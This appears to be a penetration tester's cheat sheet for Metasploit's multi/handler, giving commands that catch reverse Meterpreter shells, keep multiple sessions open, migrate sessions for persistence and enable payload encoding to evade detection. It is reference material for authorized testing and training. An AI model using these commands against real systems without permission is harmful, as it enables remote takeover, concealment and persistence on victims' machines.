# Index
- [[Metasploit]]
	- [[Metasploit Multi Handler]]
	- [[Meterpreter]]
	- [[Msfvenom]]
	- [[Searchsploit]]

# Metasploit Multi-Handler

The Metasploit Framework’s `multi/handler` is a powerful module that handles incoming reverse shells or bind shells from exploited systems. It is commonly used to connect with payloads generated by Metasploit such as Meterpreter, shell payloads, or any custom reverse shell. This ultimate edition of the cheat sheet provides an exhaustive list of Metasploit multi/handler commands, usage scenarios, and advanced techniques.

#### Basic Syntax

```bash
use exploit/multi/handler
set PAYLOAD <payload_name>
set LHOST <attack_ip>
set LPORT <attack_port>
exploit
```

## Core Options

- `set PAYLOAD <payload_name>`: Specifies the payload to handle (e.g., `windows/meterpreter/reverse_tcp`).
- `set LHOST <attack_ip>`: Defines the local IP address to use for listening for incoming connections.
- `set LPORT <attack_port>`: Specifies the local port to listen on.
- `set ExitOnSession false`: Keeps the handler running after a session is established, allowing multiple sessions.
- `set ExitOnSession true`: Exits the handler after a session is established (default).
- `set AutoRunScript <script>`: Executes a specific Meterpreter script when a session is established.
- `exploit -j`: Runs the exploit in the background as a job.
- `set SessionLogging true`: Logs sessions to files in Metasploit’s log directory.
- `set EnableStageEncoding true`: Encodes the stager to evade detection.
- `set EnableUnicodeEncoding true`: Enables Unicode encoding for payload evasion.
- `set AutoLoadStdapi true`: Automatically loads the `stdapi` (standard Meterpreter API).
- `sessions -l`: Lists active sessions.
- `sessions -i <session_id>`: Interacts with a specific session.
- `jobs -l`: Lists running background jobs.
- `jobs -K`: Terminates all background jobs.

# Commands and Usage

#### Session Management and Automation

1. **Listing Active Sessions:**Lists all active sessions handled by Metasploit.
    ```bash
    sessions -l
    ```
 2. **Interacting with a Specific Session:** Interacts with a specific session by providing the session ID.
    ```bash
    sessions -i <session_id>
    ```
3. **Migrating a Meterpreter Session:** Migrates a Meterpreter session to another process to maintain persistence and avoid detection.
    ```bash
    sessions -i <session_id>
    meterpreter > migrate <process_id>
    ```
4. **Running Scripts on Session Establishment:** Automatically migrates the session to another process upon session establishment, ensuring that the session persists.
    ```bash
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST <attack_ip>
    set LPORT <attack_port>
    set AutoRunScript post/windows/manage/migrate
    exploit
    ```
5. **Auto-Handling Multiple Sessions:** Automatically handles multiple sessions by keeping the handler active after each session is established.
    ```bash
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST <attack_ip>
    set LPORT <attack_port>
    set ExitOnSession false
    exploit -j
    ```
6. **Automating Exploit Workflow with Resource Files:** Uses Metasploit resource files to automate complex tasks. A typical resource file contains commands like `use`, `set`, `exploit`, etc., allowing for automation of entire workflows.
    ```bash
    resource /path/to/resource.rc
    ```

# Resources

|**Website**|**URL**|
|-|-|
|Metasploit Framework Documentation|https://docs.metasploit.com|
|Metasploit GitHub Repository|https://github.com/rapid7/metasploit-framework|
|Metasploit Cheat Sheet|https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/|
|Meterpreter Cheat Sheet|https://www.hackingarticles.in/meterpreter-commands-cheat-sheet/|
|Exploiting with Multi-Handler|https://www.hackingarticles.in/multi-handler-exploiting-cheat-sheet/|
|Customizing Multi-Handler Payloads|https://www.exploit-db.com/docs/english/44971-metasploit-payloads-customization.pdf|
|Setting Up Multi-Handler for Reverse Shells|https://www.hackingarticles.in/ultimate-guide-to-metasploit-payloads/|
|Post-Exploitation with Meterpreter|https://pentestlab.blog/2017/04/07/post-exploitation-with-meterpreter/|
|Metasploit Resource Files for Automation|https://null-byte.wonderhowto.com/how-to/metasploit-for-beginners-automate-your-pen-testing-with-resource-scripts-0194444/|
|Handling Multiple Sessions with Multi-Handler|https://docs.rapid7.com/metasploit/using-metasploit-handler-for-multiple-sessions/|
|Advanced Multi-Handler Techniques|https://null-byte.wonderhowto.com/how-to/metasploit-basics-gain-remote-access-victim-via-exploiting-reverse-shell-attack-0175289/|